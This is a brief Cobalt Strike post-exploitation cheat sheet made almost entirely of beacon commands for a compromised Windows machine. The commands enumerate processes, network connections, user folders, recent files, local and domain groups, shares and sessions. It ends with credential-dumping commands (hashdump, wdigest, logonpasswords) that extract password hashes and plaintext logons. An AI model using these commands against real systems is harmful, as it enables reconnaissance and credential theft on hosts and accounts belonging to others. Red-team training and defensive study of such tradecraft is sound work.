# CS Host Enumeration

## Basic Host Enumeration
```bash
ps
shell ipconfig /all
shell netstat -anop tcp
```
## Common Directories
```bash
shell dir c:\
```
```bash
shell dir c:\Users\[USER]\documents
```
```bash
shell dir c:\Users\[USER]\Downloads
```
```bash
shell dir /a c:\Users\[USER]
shell dir c:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Recent
shell type c:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Recent\[FILE].lnk
```
```bash
shell dir c:\Users\[USER]\Desktop
```
## Net Commands
```
shell net localgroup administrators
shell net localgroup administrators /domain
shell net use
shell net user [USER] /domain
shell net view \\[COMPUTER NAME] /all
shell net session
```

## nslookup
- sometimes requires FQDN
```bash
shell nslookup [HOSTNAME]
```

## Passwords
```bash
hashdump
wdigest
logonpasswords
```
